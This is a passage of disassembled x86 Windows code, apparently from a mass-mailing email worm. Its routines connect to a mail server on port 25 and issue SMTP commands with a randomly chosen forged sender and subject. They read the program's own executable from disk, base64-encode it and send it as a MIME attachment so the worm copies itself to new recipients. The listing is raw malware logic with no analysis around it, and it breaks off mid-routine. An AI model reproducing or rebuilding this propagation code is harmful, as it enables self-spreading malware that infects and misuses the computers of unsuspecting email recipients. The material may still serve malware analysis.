loc_401661:				; CODE XREF: sub_40156C+B2j
					; sub_40156C+E1j ...
		test	esi, esi
		jz	short loc_40166C
		push	esi		; hMem
		call	ds:GlobalFree

loc_40166C:				; CODE XREF: sub_40156C+F7j
		test	ebx, ebx
		jz	short loc_401677
		push	ebx		; hMem
		call	ds:GlobalFree

loc_401677:				; CODE XREF: sub_40156C+102j
		test	edi, edi
		pop	edi
		pop	esi
		pop	ebx
		jle	short loc_40168D
		lea	eax, [ebp+var_808]
		push	eax
		call	sub_401335
		pop	ecx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40168D:				; CODE XREF: sub_40156C+110j
		xor	eax, eax
		leave
		retn
sub_40156C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401691	proc near		; CODE XREF: sub_40184F+4Fp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		push	esi
		movzx	ecx, byte ptr [eax]
		shr	ecx, 2
		mov	dl, ds:byte_406174[ecx]
		mov	ecx, [esp+4+arg_4]
		mov	[ecx], dl
		mov	dl, [eax]
		movzx	esi, byte ptr [eax+1]
		and	edx, 3
		shl	edx, 4
		shr	esi, 4
		or	edx, esi
		cmp	[esp+4+arg_8], 1
		mov	dl, ds:byte_406174[edx]
		mov	[ecx+1], dl
		jle	short loc_4016E3
		mov	dl, [eax+1]
		movzx	esi, byte ptr [eax+2]
		and	edx, 0Fh
		shl	edx, 2
		shr	esi, 6
		or	edx, esi
		mov	dl, ds:byte_406174[edx]
		jmp	short loc_4016E5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4016E3:				; CODE XREF: sub_401691+36j
		mov	dl, 3Dh

loc_4016E5:				; CODE XREF: sub_401691+50j
		cmp	[esp+4+arg_8], 2
		mov	[ecx+2], dl
		pop	esi
		jle	short loc_4016FE
		mov	al, [eax+2]
		and	eax, 3Fh
		mov	al, ds:byte_406174[eax]
		jmp	short loc_401700
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4016FE:				; CODE XREF: sub_401691+5Dj
		mov	al, 3Dh

loc_401700:				; CODE XREF: sub_401691+6Bj
		mov	[ecx+3], al
		retn
sub_401691	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401704	proc near		; CODE XREF: sub_4019FF+3E7p

TimeZoneInformation= _TIME_ZONE_INFORMATION ptr	-108h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
SystemTime	= _SYSTEMTIME ptr -10h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		lea	eax, [ebp+SystemTime]
		mov	[ebp+var_2C], offset aSun ; "Sun"
		push	eax		; lpSystemTime
		mov	[ebp+var_28], offset aMon ; "Mon"
		mov	[ebp+var_24], offset aTue ; "Tue"
		mov	[ebp+var_20], offset aWed ; "Wed"
		mov	[ebp+var_1C], offset aThu ; "Thu"
		mov	[ebp+var_18], offset aFri ; "Fri"
		mov	[ebp+var_14], offset aSat ; "Sat"
		mov	[ebp+var_5C], offset aJan ; "Jan"
		mov	[ebp+var_58], offset aFeb ; "Feb"
		mov	[ebp+var_54], offset aMar ; "Mar"
		mov	[ebp+var_50], offset aApr ; "Apr"
		mov	[ebp+var_4C], offset aMay ; "May"
		mov	[ebp+var_48], offset aJun ; "Jun"
		mov	[ebp+var_44], offset aJul ; "Jul"
		mov	[ebp+var_40], offset aAug ; "Aug"
		mov	[ebp+var_3C], offset aSep ; "Sep"
		mov	[ebp+var_38], offset aOct ; "Oct"
		mov	[ebp+var_34], offset aNov ; "Nov"
		mov	[ebp+var_30], offset aDec ; "Dec"
		call	ds:GetLocalTime
		and	[ebp+TimeZoneInformation.Bias],	0
		lea	eax, [ebp+TimeZoneInformation]
		push	eax		; lpTimeZoneInformation
		call	ds:GetTimeZoneInformation
		mov	ecx, [ebp+TimeZoneInformation.Bias]
		cmp	eax, 2
		jnz	short loc_4017C0
		mov	eax, [ebp+TimeZoneInformation.DaylightBias]
		add	ecx, eax

loc_4017C0:				; CODE XREF: sub_401704+B5j
		neg	ecx
		push	esi
		push	edi
		mov	esi, ecx
		jns	short loc_4017CA
		neg	esi

loc_4017CA:				; CODE XREF: sub_401704+C2j
		cmp	[ebp+SystemTime.wDayOfWeek], 6
		jbe	short loc_4017D7
		mov	[ebp+SystemTime.wDayOfWeek], 6

loc_4017D7:				; CODE XREF: sub_401704+CBj
		cmp	[ebp+SystemTime.wMonth], 0
		jnz	short loc_4017E4
		mov	[ebp+SystemTime.wMonth], 1

loc_4017E4:				; CODE XREF: sub_401704+D8j
		cmp	[ebp+SystemTime.wMonth], 0Ch
		jbe	short loc_4017F1
		mov	[ebp+SystemTime.wMonth], 0Ch

loc_4017F1:				; CODE XREF: sub_401704+E5j
		test	ecx, ecx
		mov	ecx, offset asc_407A28 ; "+"
		jge	short loc_4017FF
		mov	ecx, offset asc_407A24 ; "-"

loc_4017FF:				; CODE XREF: sub_401704+F4j
		mov	eax, esi
		push	3Ch
		cdq
		pop	edi
		idiv	edi
		mov	eax, esi
		push	edx
		push	edi
		cdq
		pop	esi
		idiv	esi
		push	eax
		push	ecx
		movzx	eax, [ebp+SystemTime.wSecond]
		push	eax
		movzx	eax, [ebp+SystemTime.wMinute]
		push	eax
		movzx	eax, [ebp+SystemTime.wHour]
		push	eax
		movzx	eax, [ebp+SystemTime.wYear]
		push	eax
		movzx	eax, [ebp+SystemTime.wMonth]
		push	[ebp+eax*4+TimeZoneInformation.DaylightBias]
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax
		movzx	eax, [ebp+SystemTime.wDayOfWeek]
		push	[ebp+eax*4+var_2C]
		push	offset aSUSU_2u_2u_2uS ; LPCSTR
		push	[ebp+arg_0]	; LPSTR
		call	ds:wsprintfA
		add	esp, 30h
		pop	edi
		pop	esi
		leave
		retn
sub_401704	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40184F	proc near		; CODE XREF: sub_4019FF+63Ep

buf		= byte ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
Buffer		= dword	ptr -4
hFile		= dword	ptr  8
s		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		and	[ebp+var_8], 0
		push	ebx
		mov	ebx, ds:send
		push	esi
		push	edi

loc_401862:				; CODE XREF: sub_40184F+89j
					; sub_40184F+AEj
		xor	edi, edi
		mov	[ebp+var_C], edi

loc_401867:				; CODE XREF: sub_40184F+3Bj
		lea	esi, [ebp+edi+Buffer]
		push	1		; uBytes
		push	esi		; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:_lread
		test	eax, eax
		mov	[ebp+var_10], eax
		jz	short loc_401883
		inc	[ebp+var_C]
		jmp	short loc_401886
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401883:				; CODE XREF: sub_40184F+2Dj
		and	byte ptr [esi],	0

loc_401886:				; CODE XREF: sub_40184F+32j
		inc	edi
		cmp	edi, 3
		jl	short loc_401867
		xor	edi, edi
		cmp	[ebp+var_C], edi
		jz	short loc_4018C7
		push	[ebp+var_C]
		lea	eax, [ebp+buf]
		push	eax
		lea	eax, [ebp+Buffer]
		push	eax
		call	sub_401691
		add	esp, 0Ch
		xor	esi, esi

loc_4018A8:				; CODE XREF: sub_40184F+73j
		push	edi		; flags
		lea	eax, [ebp+esi+buf]
		push	1		; len
		push	eax		; buf
		push	[ebp+s]		; s
		call	ebx ; send
		cmp	eax, edi
		jz	short loc_40190B
		cmp	eax, 0FFFFFFFFh
		jz	short loc_40190B
		inc	esi
		cmp	esi, 4
		jl	short loc_4018A8
		inc	[ebp+var_8]

loc_4018C7:				; CODE XREF: sub_40184F+42j
		mov	eax, [ebp+arg_8]
		push	4
		cdq
		pop	ecx
		idiv	ecx
		cmp	[ebp+var_8], eax
		jge	short loc_4018DC
		cmp	[ebp+var_10], edi
		jnz	short loc_401862
		xor	edi, edi

loc_4018DC:				; CODE XREF: sub_40184F+84j
		cmp	[ebp+var_8], edi
		jz	short loc_4018F7
		push	edi		; flags
		push	2		; len
		push	offset buf	; buf
		push	[ebp+s]		; s
		call	ebx ; send
		cmp	eax, edi
		jz	short loc_40190B
		cmp	eax, 0FFFFFFFFh
		jz	short loc_40190B

loc_4018F7:				; CODE XREF: sub_40184F+90j
		cmp	[ebp+var_10], edi
		mov	[ebp+var_8], edi
		jnz	loc_401862
		push	1
		pop	eax

loc_401906:				; CODE XREF: sub_40184F+BFj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40190B:				; CODE XREF: sub_40184F+68j
					; sub_40184F+6Dj ...
		or	eax, 0FFFFFFFFh
		jmp	short loc_401906
sub_40184F	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401910	proc near		; CODE XREF: sub_4019FF:loc_401B27p
					; sub_4019FF+141p ...
		mov	eax, ds:dword_414BF0
		imul	eax, 343FDh
		add	eax, 269EC3h
		mov	ds:dword_414BF0, eax
		shr	eax, 10h
		and	eax, 7FFFh
		retn
sub_401910	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40192E	proc near		; CODE XREF: WinMain(x,x,x,x)+Fp

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	ds:dword_414BF0, eax
		retn
sub_40192E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401938	proc near		; CODE XREF: sub_4019FF+15Dp
					; sub_4019FF+1BDp ...

var_400		= dword	ptr -400h
buf		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 400h
		cmp	[ebp+buf], 0
		push	ebx
		push	esi
		push	edi
		jz	short loc_401975
		push	0		; flags
		push	[ebp+buf]	; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		mov	eax, [ebp+arg_4]
		push	[ebp+buf]	; buf
		push	dword ptr [eax]	; s
		call	ds:send
		test	eax, eax
		jz	loc_4019F8
		cmp	eax, 0FFFFFFFFh
		jz	loc_4019F8

loc_401975:				; CODE XREF: sub_401938+10j
					; sub_401938+B9j
		push	1
		lea	eax, [ebp+var_400]
		pop	edi
		xor	ebx, ebx
		lea	esi, [ebp+var_400]
		sub	edi, eax

loc_401988:				; CODE XREF: sub_401938+76j
		mov	eax, [ebp+arg_4]
		push	0		; flags
		push	1		; len
		push	esi		; buf
		push	dword ptr [eax]	; s
		call	ds:recv
		test	eax, eax
		jl	short loc_4019F3
		jz	short loc_4019B0
		mov	al, [esi]
		inc	ebx
		inc	esi
		cmp	al, 0Ah
		jz	short loc_4019B0
		lea	eax, [edi+esi]
		cmp	eax, 400h
		jb	short loc_401988

loc_4019B0:				; CODE XREF: sub_401938+64j
					; sub_401938+6Cj
		and	byte ptr [ebp+ebx+var_400], 0
		test	ebx, ebx
		jle	short loc_4019F8
		lea	ecx, [ebp+var_400]
		xor	eax, eax

loc_4019C4:				; CODE XREF: sub_401938+99j
		mov	dl, [ecx]
		cmp	dl, 20h
		jz	short loc_4019D0
		cmp	dl, 9
		jnz	short loc_4019D3

loc_4019D0:				; CODE XREF: sub_401938+91j
		inc	ecx
		jmp	short loc_4019C4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4019D3:				; CODE XREF: sub_401938+96j
					; sub_401938+B2j
		mov	dl, [ecx]
		cmp	dl, 30h
		jl	short loc_4019EC
		cmp	dl, 39h
		jg	short loc_4019EC
		movsx	edx, dl
		lea	eax, [eax+eax*4]
		inc	ecx
		lea	eax, [edx+eax*2-30h]
		jmp	short loc_4019D3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4019EC:				; CODE XREF: sub_401938+A0j
					; sub_401938+A5j
		cmp	byte ptr [ecx],	2Dh
		jnz	short loc_4019FA
		jmp	short loc_401975
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4019F3:				; CODE XREF: sub_401938+62j
		or	eax, 0FFFFFFFFh
		jmp	short loc_4019FA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4019F8:				; CODE XREF: sub_401938+2Ej
					; sub_401938+37j ...
		xor	eax, eax

loc_4019FA:				; CODE XREF: sub_401938+B7j
					; sub_401938+BEj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401938	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4019FF	proc near		; CODE XREF: sub_4029C9+58p

PathName	= byte ptr -0BC8h
var_7C8		= byte ptr -7C8h
var_3C8		= byte ptr -3C8h
name		= byte ptr -2C8h
var_248		= byte ptr -248h
var_20C		= byte ptr -20Ch
String1		= byte ptr -1A8h
var_168		= byte ptr -168h
buf		= byte ptr -120h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
optval		= byte ptr -8
s		= dword	ptr -4
lpString	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0BC8h
		and	[ebp+String1], 0
		push	ebx
		mov	ebx, [ebp+lpString]
		push	esi
		mov	esi, ds:lstrlenA
		push	edi
		push	ebx		; lpString
		xor	edi, edi
		call	esi ; lstrlenA
		test	eax, eax
		jle	short loc_401A46

loc_401A24:				; CODE XREF: sub_4019FF+31j
		cmp	byte ptr [edi+ebx], 40h
		jz	short loc_401A34
		push	ebx		; lpString
		inc	edi
		call	esi ; lstrlenA
		cmp	edi, eax
		jl	short loc_401A24
		jmp	short loc_401A46
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401A34:				; CODE XREF: sub_4019FF+29j
		lea	eax, [edi+ebx+1]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpyA

loc_401A46:				; CODE XREF: sub_4019FF+23j
					; sub_4019FF+33j
		cmp	[ebp+String1], 0
		jz	loc_402116
		lea	eax, [ebp+String1]
		push	eax
		call	sub_40156C
		mov	esi, eax
		pop	ecx
		test	esi, esi
		jz	loc_402116
		lea	eax, [esi+4]
		push	eax		; lpString2
		lea	eax, [ebp+name]
		push	eax		; lpString1
		call	ds:lstrcpyA
		push	esi
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		lea	eax, [ebp+name]
		push	eax		; name
		call	ds:gethostbyname
		mov	esi, eax
		test	esi, esi
		jz	loc_402116
		push	10h		; size_t
		lea	eax, [ebp+var_20]
		push	0		; int
		push	eax		; void *
		call	_memset
		mov	eax, [esi+0Ch]
		push	4
		push	dword ptr [eax]
		lea	eax, [ebp+var_1C]
		push	eax
		call	_memcpy
		add	esp, 18h
		mov	word ptr [ebp+var_20], 2
		push	19h		; hostshort
		call	ds:htons
		push	6		; protocol
		push	1		; type
		push	2		; af
		mov	word ptr [ebp+var_20+2], ax
		call	ds:socket
		mov	esi, ds:setsockopt
		lea	ecx, [ebp+optval]
		push	4		; optlen
		push	ecx		; optval
		mov	edi, 0FFFFh
		push	1006h		; optname
		push	edi		; level
		push	eax		; s
		mov	[ebp+s], eax
		mov	dword ptr [ebp+optval],	3A98h
		call	esi ; setsockopt
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		push	1005h		; optname
		push	edi		; level
		push	[ebp+s]		; s
		call	esi ; setsockopt
		lea	eax, [ebp+var_20]
		push	10h		; namelen
		push	eax		; name
		push	[ebp+s]		; s
		call	ds:connect
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_401B27
		xor	esi, esi
		jmp	loc_402109
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401B27:				; CODE XREF: sub_4019FF+11Fj
		call	sub_401910
		push	1Ah
		cdq
		pop	ecx
		idiv	ecx
		mov	esi, edx
		shl	esi, 2
		mov	eax, ds:dword_407154[esi]
		mov	[ebp+var_10], eax
		call	sub_401910
		cdq
		idiv	ds:dword_414BF8
		mov	eax, ds:dword_40AAF0[edx*4]
		mov	[ebp+var_C], eax
		lea	eax, [ebp+s]
		push	eax
		push	0
		call	sub_401938
		mov	ebx, 0C8h
		pop	ecx
		cmp	eax, ebx
		pop	ecx
		jl	loc_4020FB
		cmp	eax, 190h
		jge	loc_4020FB
		lea	eax, [ebp+buf]
		push	offset aEhlo	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+String1]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		mov	edi, offset buf	; "\r\n"
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401938
		add	esp, 20h
		cmp	eax, ebx
		jl	short loc_401BCF
		cmp	eax, 12Bh
		jle	short loc_401C26

loc_401BCF:				; CODE XREF: sub_4019FF+1C7j
		lea	eax, [ebp+buf]
		push	offset aHelo	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+String1]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401938
		add	esp, 20h
		cmp	eax, ebx
		jl	loc_4020FB
		cmp	eax, 12Bh
		jg	loc_4020FB

loc_401C26:				; CODE XREF: sub_4019FF+1CEj
		lea	eax, [ebp+buf]
		push	offset aMailFrom ; char	*
		push	eax		; char *
		call	_strcpy
		push	[ebp+var_C]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset asc_407C98 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401938
		add	esp, 20h
		cmp	eax, ebx
		jl	loc_4020FB
		cmp	eax, 12Bh
		jg	loc_4020FB
		lea	eax, [ebp+buf]
		push	offset aRcptTo	; char *
		push	eax		; char *
		call	_strcpy
		push	[ebp+lpString]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset asc_407C98 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401938
		add	esp, 20h
		cmp	eax, ebx
		jl	loc_4020FB
		cmp	eax, 12Bh
		jg	loc_4020FB
		lea	eax, [ebp+buf]
		push	offset aData	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401938
		add	esp, 10h
		cmp	eax, ebx
		jl	loc_4020FB
		cmp	eax, 18Fh
		jg	loc_4020FB
		push	ds:dword_4071BC[esi] ; char *
		lea	eax, [ebp+var_7C8]
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+PathName]
		pop	ecx
		push	400h		; nSize
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+var_248]
		push	offset aContentTypeApp ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+buf]
		push	offset aFrom	; char *
		push	eax		; char *
		call	_strcpy
		push	[ebp+var_C]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aTo	; char *
		push	eax		; char *
		call	_strcat
		push	[ebp+lpString]	; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aSubject	; char *
		push	eax		; char *
		call	_strcat
		add	esp, 40h
		lea	eax, [ebp+buf]
		push	[ebp+var_10]	; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aDate	; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_3C8]
		push	eax
		call	sub_401704
		lea	eax, [ebp+var_3C8]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aMimeVersion1_0 ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 2Ch
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		mov	esi, ds:send
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		call	sub_401910
		push	eax
		call	sub_401910
		push	eax
		call	sub_401910
		push	0Fh
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_20C]
		push	edx
		push	0
		push	offset a_nextpart__3u_ ; LPCSTR
		push	eax		; LPSTR
		call	ds:wsprintfA
		lea	eax, [ebp+buf]
		push	offset aContentTypeMul ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_20C]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset asc_407BC0 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aXPriority3 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aXMsmailPriorit ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 40h
		lea	eax, [ebp+buf]
		push	offset aThisIsAMultiPa ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+buf]
		pop	ecx
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		lea	eax, [ebp+var_168]
		push	offset asc_407B58 ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_20C]
		push	eax		; char *
		lea	eax, [ebp+var_168]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_168]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_168]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+buf]
		push	offset aContentTypeTex ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 28h
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		call	sub_401910
		push	6
		cdq
		pop	ecx
		idiv	ecx
		push	0		; flags
		mov	edi, ds:off_407224[edx*4]
		push	edi		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		push	edi		; buf
		push	[ebp+s]		; s
		call	esi ; send
		lea	eax, [ebp+buf]
		push	offset asc_407AF8 ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_168]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_248]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_7C8]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset aContentTransfe ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_7C8]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+buf]
		push	offset asc_407A9C ; char *
		push	eax		; char *
		call	_strcat
		add	esp, 38h
		lea	eax, [ebp+buf]
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send
		lea	eax, [ebp+PathName]
		push	0		; iReadWrite
		push	eax		; lpPathName
		call	ds:_lopen
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jz	loc_4020FB
		push	48h
		push	[ebp+s]
		push	edi
		call	sub_40184F
		add	esp, 0Ch
		cmp	eax, 0FFFFFFFFh
		jz	loc_4020FB
		push	edi		; hFile
		call	ds:_lclose
		lea	eax, [ebp+var_168]
		push	offset asc_407A94 ; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_20C]
		push	eax		; char *
		lea	eax, [ebp+var_168]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_168]
		push	offset asc_407A8C ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_168]
		push	eax		; char *
		lea	eax, [ebp+buf]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+buf]
		push	offset a_	; char *
		push	eax		; char *
		call	_strcat
